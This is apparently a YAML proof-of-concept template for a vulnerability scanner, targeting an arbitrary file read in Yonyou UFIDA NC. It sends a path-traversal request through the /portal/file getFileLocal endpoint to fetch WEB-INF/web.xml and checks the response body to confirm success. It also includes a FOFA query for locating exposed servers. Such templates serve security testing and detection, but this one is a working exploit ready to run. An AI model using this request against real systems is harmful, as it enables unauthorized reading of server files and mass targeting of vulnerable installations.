id: poc-yaml-yongyou-ufida-getfilelocal-anyfile-read
info:
  name: 用友ufida-getFileLocal任意文件读取
  severity: high
  tags:
  - 文件读取
  finger: ufida-nc
  fofa: app="用友-UFIDA-NC"
requests:
- method: GET
  path: /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml
  expression: 'status_code == 200 &&

    contains(body,"java.sun.com") &&

    contains(body,"NCInvokerServlet")

    '
variables: {}
transport: http
